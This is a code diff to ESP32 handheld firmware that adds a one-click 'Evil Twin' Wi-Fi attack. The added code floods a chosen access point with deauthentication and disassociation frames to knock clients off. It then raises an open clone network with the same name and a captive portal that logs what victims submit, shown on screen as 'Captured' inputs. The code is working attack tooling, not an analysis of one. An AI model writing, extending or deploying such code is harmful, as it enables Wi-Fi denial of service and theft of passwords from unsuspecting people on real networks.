@@ -92,6 +92,16 @@ bool wifiDeauthActive = false;
 String deauthTargetBSSID = "";
 int deauthTargetChannel = 0;
 
+// Evil Twin attack state
+bool evilTwinRunning = false;
+String evilTwinSsid = "";
+uint32_t evilTwinDeauthsSent = 0;
+uint32_t evilTwinStartTime = 0;
+uint8_t evilTwinSelectIdx = 0;
+String capturedInputs[8];
+uint8_t capturedInputCount = 0;
+uint32_t lastEvilTwinRefresh = 0;
+
 String toastMessage;
 String selectedSsid;
 String keyboardTitle;
@@ -102,6 +112,8 @@ String attackUserValue = "";
 String irCode = "20DF10EF";
 String wifiNames[12];
 int32_t wifiRssi[12];
+String wifiBssid[12];
+int wifiChannel[12];
 uint8_t wifiCount = 0;
 BleEntry bleEntries[8];
 Device devices[20];
@@ -289,6 +301,7 @@ String apUserValue;  // last value submitted from captive portal
 DNSServer apDns;
 WebServer apWeb(80);
 void showToast(const String& message);
+void showLoading(const String& title);
 
 void serveCaptivePage() {
   apWeb.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
@@ -369,50 +382,173 @@ void stopWifiAttack() {
   }
 }
 
-// Send deauthentication frames to disconnect clients from target AP
-void sendDeauthAttack() {
-  if (deauthTargetBSSID.length() == 0 || deauthTargetChannel == 0) {
-    showToast("No target info for deauth");
-    return;
+// Parse a MAC string "AA:BB:CC:DD:EE:FF" into 6 bytes
+bool parseMac(const String& macStr, uint8_t* out) {
+  if (macStr.length() != 17) return false;
+  uint32_t m[6];
+  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
+             &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
+    for (int i = 0; i < 6; i++) out[i] = (uint8_t)m[i];
+    return true;
   }
-  
-  WiFi.mode(WIFI_STA);
-  esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
-  WiFi.setTxPower(WIFI_POWER_19_5dBm);
-  
+  return false;
+}
+
+// Send aggressive deauthentication burst on a specific channel/BSSID
+// Returns number of frames sent
+uint32_t sendDeauthBurst(const String& bssid, int channel, int rounds) {
+  if (channel < 1 || channel > 14) return 0;
+
+  uint8_t apMac[6] = {0};
+  bool hasMac = parseMac(bssid, apMac);
+
+  // Build deauth frame: AP -> broadcast (reason=7: Class 3 frame from non-associated STA)
   uint8_t deauthFrame[26] = {
-    0xC0, 0x00,
-    0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x01, 0x00
+    0xC0, 0x00,                         // Frame Control: Deauthentication
+    0x00, 0x00,                         // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP BSSID
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP BSSID
+    0x00, 0x00,                         // Sequence number (will increment)
+    0x07, 0x00                          // Reason code: 7
   };
-  
-  if (deauthTargetBSSID.length() == 17) {
-    uint32_t m[6];
-    if (sscanf(deauthTargetBSSID.c_str(), "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
-      for (int i = 0; i < 6; i++) {
-        deauthFrame[10 + i] = (uint8_t)m[i];
-        deauthFrame[16 + i] = (uint8_t)m[i];
-      }
+
+  // Build disassociation frame (some devices ignore deauth but respect disassoc)
+  uint8_t disassocFrame[26];
+  memcpy(disassocFrame, deauthFrame, 26);
+  disassocFrame[0] = 0xA0; // Disassociation
+  disassocFrame[24] = 0x08; // Reason: Disassociated because sending STA is leaving
+
+  if (hasMac) {
+    memcpy(&deauthFrame[10], apMac, 6);   // Source
+    memcpy(&deauthFrame[16], apMac, 6);   // BSSID
+    memcpy(&disassocFrame[10], apMac, 6);
+    memcpy(&disassocFrame[16], apMac, 6);
+  }
+
+  // Set channel and max power
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_max_tx_power(78); // ~19.5 dBm
+
+  uint32_t sent = 0;
+  for (int r = 0; r < rounds; r++) {
+    // Increment sequence number for realism
+    uint16_t seq = (r & 0x0FFF) << 4;
+    deauthFrame[22] = seq & 0xFF;
+    deauthFrame[23] = (seq >> 8) & 0xFF;
+    disassocFrame[22] = seq & 0xFF;
+    disassocFrame[23] = (seq >> 8) & 0xFF;
+
+    // Deauth: AP -> broadcast
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
+    sent++;
+
+    // Disassoc: AP -> broadcast
+    esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, sizeof(disassocFrame), false);
+    sent++;
+
+    // Also send deauth "from client to AP" (reverse direction)
+    if (hasMac) {
+      uint8_t reverseDeauth[26];
+      memcpy(reverseDeauth, deauthFrame, 26);
+      // Swap: dest=AP, source=broadcast, bssid=AP
+      memcpy(&reverseDeauth[4], apMac, 6);                     // Destination = AP
+      memset(&reverseDeauth[10], 0xFF, 6);                     // Source = broadcast
+      esp_wifi_80211_tx(WIFI_IF_STA, reverseDeauth, 26, false);
+      sent++;
+    }
+
+    delay(2); // Very short delay for maximum flood
+  }
+  return sent;
+}
+
+// ---- Evil Twin: one-click attack ----
+void stopEvilTwin() {
+  if (!evilTwinRunning) return;
+  stopCaptivePortal();
+  WiFi.softAPdisconnect(true);
+  delay(50);
+  WiFi.mode(WIFI_STA);
+  evilTwinRunning = false;
+  wifiAttackActive = false;
+  evilTwinSsid = "";
+  showToast("Evil Twin stopped");
+}
+
+void startEvilTwin(uint8_t targetIdx) {
+  if (targetIdx >= wifiCount) { showToast("Invalid target"); return; }
+
+  evilTwinSsid = wifiNames[targetIdx];
+  String bssid = wifiBssid[targetIdx];
+  int ch = wifiChannel[targetIdx];
+  evilTwinDeauthsSent = 0;
+  capturedInputCount = 0;
+  evilTwinStartTime = millis();
+
+  showLoading("Launching Evil Twin...");
+
+  // Phase 1: Deauth burst on target channel
+  WiFi.disconnect(true, false);
+  delay(50);
+  WiFi.mode(WIFI_STA);
+  esp_wifi_start();
+  delay(50);
+
+  // Store target info for possible continuous deauth
+  deauthTargetBSSID = bssid;
+  deauthTargetChannel = ch;
+
+  if (bssid.length() == 17 && ch > 0) {
+    evilTwinDeauthsSent = sendDeauthBurst(bssid, ch, 150);
+  } else {
+    // Broadcast deauth on channels 1, 6, 11 (most common)
+    int commonCh[] = {1, 6, 11};
+    for (int c = 0; c < 3; c++) {
+      evilTwinDeauthsSent += sendDeauthBurst("FF:FF:FF:FF:FF:FF", commonCh[c], 50);
     }
   }
-  
-  for (int i = 0; i < 50; i++) {
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
-    
-    uint8_t deauthFrameClient[26];
-    memcpy(deauthFrameClient, deauthFrame, sizeof(deauthFrame));
-    memcpy(&deauthFrameClient[0], &deauthFrame[4], 6);
-    memcpy(&deauthFrameClient[4], &deauthFrame[0], 6);
-    
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameClient, sizeof(deauthFrameClient), false);
-    delay(10);
+
+  // Phase 2: Start clone AP (open, same SSID)
+  WiFi.mode(WIFI_AP_STA);
+  delay(50);
+  // Use channel 1 for our AP (different from target to avoid collision)
+  bool ok = WiFi.softAP(evilTwinSsid.c_str(), NULL, 1, 0, 4); // open, max 4 clients
+  if (!ok) {
+    // Retry without channel specification
+    ok = WiFi.softAP(evilTwinSsid.c_str());
   }
-  
-  showToast("Deauth attack sent");
+
+  if (!ok) {
+    showToast("Failed to start clone AP!");
+    return;
+  }
+
+  // Phase 3: Start captive portal
+  // Override the /setvalue handler to capture into our evil twin array
+  apCaptivePortal = true;
+  startCaptivePortal();
+  // Re-register /setvalue to also store in capturedInputs
+  apWeb.on("/setvalue", []() {
+    String val = apWeb.arg("value");
+    apUserValue = val;
+    // Store in captured inputs ring buffer
+    if (capturedInputCount < 8) {
+      capturedInputs[capturedInputCount] = val;
+      capturedInputCount++;
+    } else {
+      // Shift and append
+      for (int i = 0; i < 7; i++) capturedInputs[i] = capturedInputs[i + 1];
+      capturedInputs[7] = val;
+    }
+    showToast("CAPTURED: " + val);
+    pageNeedsRedraw = true;
+    apWeb.send(200, "text/plain", "Connected successfully");
+  });
+
+  evilTwinRunning = true;
+  wifiAttackActive = true;
+  showToast("Evil Twin active: " + evilTwinSsid);
 }
 void loadPortalFromSD() {
   if (!SD.begin(Board::kSdCs)) {
@@ -951,6 +1087,8 @@ void scanWifi() {
     if (duplicate) continue;
     wifiNames[wifiCount] = ssid;
     wifiRssi[wifiCount] = WiFi.RSSI(i);
+    wifiBssid[wifiCount] = WiFi.BSSIDstr(i);
+    wifiChannel[wifiCount] = WiFi.channel(i);
     ++wifiCount;
   }
   WiFi.scanDelete();
@@ -1952,7 +2090,7 @@ void drawFun() {
   card(12, 88, 145, 40, "BLE Trackers");
   card(163, 88, 145, 40, "Saved BLE (5)");
   
-  card(12, 134, 145, 40, "Net Stats");
+  card(12, 134, 145, 40, "WiFi Attack");
   card(163, 134, 145, 40, "Create Wi-Fi AP");
 
   card(12, 196, 76, 28, "Back");
@@ -2122,37 +2260,108 @@ void drawFunBleMonitor() {
   card(205, 202, 103, 32, "Stop");
 }
 
+void drawEvilTwinLive() {
+  // Called frequently to update the live section without full redraw
+  const Theme& c = theme();
+  // Live info area: y 110-196
+  tft.fillRect(10, 110, 300, 86, c.background);
+
+  if (evilTwinRunning) {
+    // Cloned SSID
+    tft.setTextColor(c.accent, c.background);
+    tft.setTextSize(1);
+    tft.drawString("Clone: " + trimText(evilTwinSsid, 22), 14, 112, 2);
+
+    // Stats line
+    uint32_t elapsed = (millis() - evilTwinStartTime) / 1000;
+    String stats = String(WiFi.softAPgetStationNum()) + " clients | "
+                 + String(evilTwinDeauthsSent) + " deauths | "
+                 + String(elapsed) + "s";
+    tft.setTextColor(c.muted, c.background);
+    tft.drawString(trimText(stats, 40), 14, 130, 1);
+
+    // Captured inputs (show last 3)
+    tft.setTextColor(c.text, c.background);
+    tft.drawString("Captured (" + String(capturedInputCount) + "):", 14, 144, 1);
+    uint16_t inputColor = 0x07E0; // Green
+    tft.setTextColor(inputColor, c.background);
+    int startIdx = capturedInputCount > 3 ? capturedInputCount - 3 : 0;
+    for (int i = startIdx; i < (int)capturedInputCount && i < startIdx + 3; i++) {
+      int row = i - startIdx;
+      tft.drawString(String(i + 1) + ": " + trimText(capturedInputs[i], 32), 14, 156 + row * 12, 1);
+    }
+    if (capturedInputCount == 0) {
+      tft.setTextColor(c.muted, c.background);
+      tft.drawString("Waiting for victim input...", 14, 156, 1);
+    }
+  } else {
+    // Not running - show target selection help
+    if (wifiCount > 0 && evilTwinSelectIdx < wifiCount) {
+      tft.setTextColor(c.text, c.background);
+      tft.drawString("Target: " + trimText(wifiNames[evilTwinSelectIdx], 20), 14, 114, 2);
+      tft.setTextColor(c.muted, c.background);
+      tft.drawString("BSSID: " + wifiBssid[evilTwinSelectIdx], 14, 134, 1);
+      tft.drawString("Ch: " + String(wifiChannel[evilTwinSelectIdx])
+                    + "  |  " + String(wifiRssi[evilTwinSelectIdx]) + " dBm", 14, 146, 1);
+      tft.drawString("Net " + String(evilTwinSelectIdx + 1) + "/" + String(wifiCount)
+                    + " - tap Select to cycle", 14, 160, 1);
+    } else {
+      tft.setTextColor(c.muted, c.background);
+      tft.drawString("No target selected", 14, 120, 2);
+      tft.drawString("Tap SCAN then SELECT a target", 14, 145, 1);
+    }
+  }
+}
+
 void drawFunWifiAttack() {
   const Theme& c = theme();
   tft.fillScreen(c.background);
-  drawStatusBar("WIFI ATTACK - SELECT TARGET");
+  drawStatusBar("EVIL TWIN");
 
-  // Row 1: Target & Status info cards (y: 38, h: 44)
-  String targetDetail = selectedAttackSsid.length() > 0 ? selectedAttackSsid : (wifiCount > 0 ? "Tap Select" : "Tap Scan");
-  card(10, 38, 145, 44, "SELECTED TARGET", targetDetail);
+  // Row 1 (y 38): SCAN + SELECT buttons
+  actionButton(10, 38, 96, 34, "SCAN");
+  card(112, 38, 96, 34, "SELECT");
 
-  String attackDetail = wifiAttackActive ? "ACTIVE - Rogue AP" : (wifiScanInProgress ? "Scanning..." : (String(wifiCount) + " nets"));
-  card(165, 38, 145, 44, "ATTACK STATUS", attackDetail, wifiAttackActive);
-
-  // Row 2: Action buttons (y: 86, h: 44)
-  actionButton(10, 86, 145, 44, wifiScanInProgress ? "SCANNING..." : "SCAN NETWORKS");
-  actionButton(165, 86, 145, 44, "SELECT TARGET");
-
-  // Row 3: User Input & Start/Stop Attack (y: 134, h: 44)
-  String userDisp = attackUserValue.length() ? trimText(attackUserValue, 16) : "No input";
-  card(10, 134, 145, 44, "USER INPUT", userDisp);
-  
-  String attackBtnLabel = "SELECT TARGET FIRST";
-  if (wifiAttackActive) {
-    attackBtnLabel = "STOP ATTACK";
-  } else if (selectedAttackSsid.length() > 0) {
-    attackBtnLabel = "START ATTACK";
+  // Row 1 right: LAUNCH or STOP button
+  if (evilTwinRunning) {
+    // Red-ish stop button
+    tft.fillRoundRect(214, 38, 96, 34, 6, 0xF800);
+    tft.setTextColor(0xFFFF, 0xF800);
+    tft.setTextSize(1);
+    tft.drawCentreString("STOP", 262, 46, 2);
+  } else {
+    actionButton(214, 38, 96, 34, "LAUNCH");
   }
-  actionButton(165, 134, 145, 44, attackBtnLabel);
 
-  // Row 4: Navigation (y: 182, h: 46)
-  card(10, 182, 145, 46, "Back");
-  card(165, 182, 145, 46, "Home");
+  // Row 2 (y 76): Status banner
+  if (evilTwinRunning) {
+    tft.fillRoundRect(10, 76, 300, 28, 5, c.accent);
+    tft.setTextColor(c.header, c.accent);
+    tft.setTextSize(1);
+    tft.drawCentreString("ACTIVE: " + trimText(evilTwinSsid, 24), 160, 82, 2);
+  } else {
+    tft.fillRoundRect(10, 76, 300, 28, 5, c.surface);
+    tft.drawRoundRect(10, 76, 300, 28, 5, c.surfaceRaised);
+    tft.setTextColor(c.muted, c.surface);
+    tft.setTextSize(1);
+    String statusTxt = wifiCount > 0
+      ? (String(wifiCount) + " networks | Select target & Launch")
+      : "Tap SCAN to find targets";
+    tft.drawCentreString(statusTxt, 160, 82, 2);
+  }
+
+  // Live data area (y 110-196) - drawn by helper
+  drawEvilTwinLive();
+
+  // Bottom row (y 200): Back + Re-Deauth
+  card(10, 200, 80, 32, "Back");
+  if (evilTwinRunning) {
+    actionButton(96, 200, 110, 32, "RE-DEAUTH");
+    card(212, 200, 98, 32, "Clients:" + String(WiFi.softAPgetStationNum()));
+  } else {
+    card(96, 200, 110, 32, String(wifiCount) + " Networks");
+    card(212, 200, 98, 32, "Home");
+  }
 }
 void drawFunWifiAp() {
   const Theme& c = theme();
@@ -2563,130 +2772,89 @@ void handleTap(int x, int y) {
 
 
 } else if (currentPage == Page::FunWifiAttack) {
-    // Row 1: Target card (x < 160) or Status card (x >= 160)  y: 36 to 84
-    if (y >= 36 && y < 84) {
-      if (x < 160) {
-        if (wifiCount > 0) {
-          int currentIdx = -1;
-          for (uint8_t i = 0; i < wifiCount; ++i) {
-            if (wifiNames[i] == selectedAttackSsid) {
-              currentIdx = i;
-              break;
-            }
-          }
-          currentIdx = (currentIdx + 1) % wifiCount;
-          selectedAttackSsid = wifiNames[currentIdx];
-          showToast("Target: " + selectedAttackSsid);
-          pageNeedsRedraw = true;
-        } else {
-          showToast("Tap Scan Networks first");
-        }
-      } else {
-        if (wifiAttackActive) {
-          showToast("Attack is active (Rogue AP)");
-        } else {
-          showToast(String(wifiCount) + " networks scanned");
-        }
-      }
-    // Row 2: Scan Networks (x < 160) | Select Target (x >= 160)  y: 84 to 132
-    } else if (y >= 84 && y < 132) {
-      if (x < 160) {
-        if (!wifiScanInProgress) {
+    // Row 1: SCAN (x<108) | SELECT (x<212) | LAUNCH/STOP (x>=212)  y: 36-74
+    if (y >= 36 && y < 74) {
+      if (x < 108) {
+        // SCAN button
+        if (evilTwinRunning) {
+          showToast("Stop attack before scanning");
+        } else if (!wifiScanInProgress) {
           wifiScanInProgress = true;
           scanWifi();
           wifiScanInProgress = false;
-          if (wifiCount > 0 && selectedAttackSsid.length() == 0) {
-            selectedAttackSsid = wifiNames[0];
-          }
+          if (wifiCount > 0) evilTwinSelectIdx = 0;
           pageNeedsRedraw = true;
+        }
+      } else if (x < 212) {
+        // SELECT button - cycle through scanned networks
+        if (wifiCount == 0) {
+          showToast("Tap SCAN first");
         } else {
-          showToast("Scan in progress...");
+          evilTwinSelectIdx = (evilTwinSelectIdx + 1) % wifiCount;
+          showToast("Target: " + wifiNames[evilTwinSelectIdx]);
+          pageNeedsRedraw = true;
         }
       } else {
-        if (wifiScanInProgress) {
-          showToast("Please wait for scan to finish");
-        } else if (wifiCount == 0) {
-          showToast("No networks. Tap Scan first");
-        } else {
-          int currentIdx = -1;
-          for (uint8_t i = 0; i < wifiCount; ++i) {
-            if (wifiNames[i] == selectedAttackSsid) {
-              currentIdx = i;
-              break;
-            }
-          }
-          currentIdx = (currentIdx + 1) % wifiCount;
-          selectedAttackSsid = wifiNames[currentIdx];
-          showToast("Target: " + selectedAttackSsid);
+        // LAUNCH or STOP button
+        if (evilTwinRunning) {
+          stopEvilTwin();
           pageNeedsRedraw = true;
+        } else {
+          if (wifiCount == 0) {
+            showToast("Scan networks first!");
+          } else {
+            startEvilTwin(evilTwinSelectIdx);
+            pageNeedsRedraw = true;
+          }
         }
       }
-    // Row 3: User Input (x < 160) | Start/Stop Attack (x >= 160)  y: 132 to 184
-    } else if (y >= 132 && y < 184) {
-      if (x < 160) {
-        // User Input box tapped
-        startKeyboard(KeyboardTarget::UserInput, "USER INPUT", attackUserValue, false);
+    // Row 2: Status banner tap (y 74-108)
+    } else if (y >= 74 && y < 108) {
+      if (evilTwinRunning) {
+        showToast("Clients: " + String(WiFi.softAPgetStationNum())
+                + " | Captured: " + String(capturedInputCount));
       } else {
-        // Start/Stop Attack button
-        if (wifiAttackActive) {
-          stopWifiAttack();
-          pageNeedsRedraw = true;
-        } else if (selectedAttackSsid.length() > 0) {
-          // IMPROVED DEAUTH ATTACK STARTS HERE
-          wifiAttackActive = true;
-          deauthTargetBSSID = "";
-          deauthTargetChannel = 0;
-          
-          // First, connect to target AP to get its BSSID and channel
-          showToast("Connecting to target: " + selectedAttackSsid + "...");
-          WiFi.disconnect(true, false);
-          delay(100);
-          WiFi.mode(WIFI_STA);
-          WiFi.setTxPower(WIFI_POWER_19_5dBm);
-          WiFi.begin(selectedAttackSsid.c_str(), ""); // Try connecting without password
-          
-          // Wait briefly for connection attempt to get AP info
-          unsigned long startTime = millis();
-          while (millis() - startTime < 3000 && wifiConnecting) {
-            delay(100);
-          }
-          
-          // Get AP information (even if not fully connected, we might get BSSID)
-          String bssid = WiFi.BSSIDstr(); if (bssid.length() > 0 && bssid != "00:00:00:00:00:00") {
-            deauthTargetBSSID = bssid;
-            deauthTargetChannel = WiFi.channel();
-            showToast("Target AP: " + deauthTargetBSSID + " Ch:" + String(deauthTargetChannel));
-          } else {
-            showToast("Could not get AP info, using broadcast deauth");
-            // Fallback: we'll still try but might be less effective
-          }
-          
-          // Send deauth attack to kick clients off the target AP
-          sendDeauthAttack();
-          
-          // Now start our rogue AP
-          WiFi.mode(WIFI_AP_STA);
-          bool apStarted = WiFi.softAP(selectedAttackSsid.c_str());
-          
-          if (apStarted) {
-            showToast("Rogue AP started: " + selectedAttackSsid);
-          } else {
-            showToast("Failed to start AP");
-            wifiAttackActive = false;
-          }
-          // IMPROVED DEAUTH ATTACK ENDS HERE
-          
-          pageNeedsRedraw = true;
-        } else {
-          showToast("Select a target first!");
-        }
+        showToast(String(wifiCount) + " networks available");
       }
-    // Row 4: Back (x < 160) | Home (x >= 160)  y: 184 to 240
-    } else if (y >= 184) {
-      if (x < 160) {
+    // Middle area tapped (y 108-196) - show details
+    } else if (y >= 108 && y < 196) {
+      if (evilTwinRunning && capturedInputCount > 0) {
+        // Show last captured input as toast
+        showToast("Last: " + capturedInputs[capturedInputCount - 1]);
+      } else if (!evilTwinRunning && wifiCount > 0) {
+        // Cycle target on tap in the info area too
+        evilTwinSelectIdx = (evilTwinSelectIdx + 1) % wifiCount;
+        showToast("Target: " + wifiNames[evilTwinSelectIdx]);
+        pageNeedsRedraw = true;
+      }
+    // Bottom row (y >= 196)
+    } else if (y >= 196) {
+      if (x < 90) {
+        // Back button
+        if (evilTwinRunning) stopEvilTwin();
         navigateTo(Page::Fun);
-      } else {
+      } else if (x < 210 && evilTwinRunning) {
+        // RE-DEAUTH button - send another burst
+        showToast("Sending deauth burst...");
+        if (deauthTargetBSSID.length() == 17 && deauthTargetChannel > 0) {
+          // Temporarily switch to STA for deauth, then back to AP_STA
+          uint32_t extra = sendDeauthBurst(deauthTargetBSSID, deauthTargetChannel, 100);
+          evilTwinDeauthsSent += extra;
+          showToast("Sent " + String(extra) + " more deauth frames");
+        } else {
+          int commonCh[] = {1, 6, 11};
+          for (int ci = 0; ci < 3; ci++) {
+            evilTwinDeauthsSent += sendDeauthBurst("FF:FF:FF:FF:FF:FF", commonCh[ci], 30);
+          }
+          showToast("Broadcast deauth sent");
+        }
+        pageNeedsRedraw = true;
+      } else if (!evilTwinRunning && x >= 210) {
+        // Home button (only when not running)
         navigateTo(Page::Home);
+      } else if (evilTwinRunning && x >= 210) {
+        // Clients info card
+        showToast("Connected: " + String(WiFi.softAPgetStationNum()));
       }
     }
   } else if (currentPage == Page::FunWifiAp) {
@@ -2839,6 +3007,13 @@ void loop() {
   if (captiveRunning) {
     apDns.processNextRequest();
     apWeb.handleClient();
+  }
+
+  // Evil Twin live refresh (every 2 seconds)
+  if (evilTwinRunning && currentPage == Page::FunWifiAttack
+      && (millis() - lastEvilTwinRefresh > 2000)) {
+    lastEvilTwinRefresh = millis();
+    drawEvilTwinLive();
   }
 
   // Redraw if background event (e.g. captive portal submit) triggered it
